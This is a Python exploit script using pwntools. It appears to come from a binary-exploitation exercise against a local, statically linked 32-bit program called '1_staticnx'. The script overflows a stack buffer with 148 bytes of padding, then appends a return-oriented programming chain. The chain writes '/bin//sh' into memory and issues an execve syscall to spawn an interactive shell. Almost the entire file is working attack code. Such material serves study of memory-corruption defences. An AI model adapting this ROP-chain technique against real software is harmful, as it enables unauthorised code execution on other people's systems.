#!/usr/bin/python

# NO PIE, NO ASLR, NO CANARY, NX

# To use rop gadgets like this, the binary needs to be big, or static linked. This way we can have a lot of gadgets.
# We use the power to overwrite the return address with a chain of addresses. These chain is going to construct
# a stack with enought data to perform a system call and pop a shell.

# ASLR should be obviously disabled, or, maybe, some leak to calculate the right adresses. Is possible? Dont know.

from pwn import *
from struct import pack

def create_exploit():
    # Create payload
    overflow = 'A' * 148

    # ROPgadget --binary 1_staticnx --ropchain
    rop = pack('<I', 0x0807299a) # pop edx ; ret
    rop += pack('<I', 0x080ee060) # @ .data
    rop += pack('<I', 0x080bbb46) # pop eax ; ret
    rop += '/bin'
    rop += pack('<I', 0x0805495b) # mov dword ptr [edx], eax ; ret
    rop += pack('<I', 0x0807299a) # pop edx ; ret
    rop += pack('<I', 0x080ee064) # @ .data + 4
    rop += pack('<I', 0x080bbb46) # pop eax ; ret
    rop += '//sh'
    rop += pack('<I', 0x0805495b) # mov dword ptr [edx], eax ; ret
    rop += pack('<I', 0x0807299a) # pop edx ; ret
    rop += pack('<I', 0x080ee068) # @ .data + 8
    rop += pack('<I', 0x080493e3) # xor eax, eax ; ret
    rop += pack('<I', 0x0805495b) # mov dword ptr [edx], eax ; ret
    rop += pack('<I', 0x080481d1) # pop ebx ; ret
    rop += pack('<I', 0x080ee060) # @ .data
    rop += pack('<I', 0x080e2fc9) # pop ecx ; ret
    rop += pack('<I', 0x080ee068) # @ .data + 8
    rop += pack('<I', 0x0807299a) # pop edx ; ret
    rop += pack('<I', 0x080ee068) # @ .data + 8
    rop += pack('<I', 0x080493e3) # xor eax, eax ; ret
    rop += pack('<I', 0x0807e1df) # inc eax ; ret
    rop += pack('<I', 0x0807e1df) # inc eax ; ret
    rop += pack('<I', 0x0807e1df) # inc eax ; ret
    rop += pack('<I', 0x0807e1df) # inc eax ; ret
    rop += pack('<I', 0x0807e1df) # inc eax ; ret
    rop += pack('<I', 0x0807e1df) # inc eax ; ret
    rop += pack('<I', 0x0807e1df) # inc eax ; ret
    rop += pack('<I', 0x0807e1df) # inc eax ; ret
    rop += pack('<I', 0x0807e1df) # inc eax ; ret
    rop += pack('<I', 0x0807e1df) # inc eax ; ret
    rop += pack('<I', 0x0807e1df) # inc eax ; ret
    rop += pack('<I', 0x08070605) # int 0x80

    payload = overflow + rop

    return payload

def write_to_file():
    expl = create_exploit()
    f = open('xpl', 'w')
    f.write(expl)
    f.close

def main():
    # Start a process
    p = process('./1_staticnx')

    payload = create_exploit()

    # Print process id and wait for enter
    # Get the pid and attach in gdb
    raw_input(str(p.proc.pid))
    
    # Send
    p.send(payload)
    p.interactive()

main()
#write_to_file()
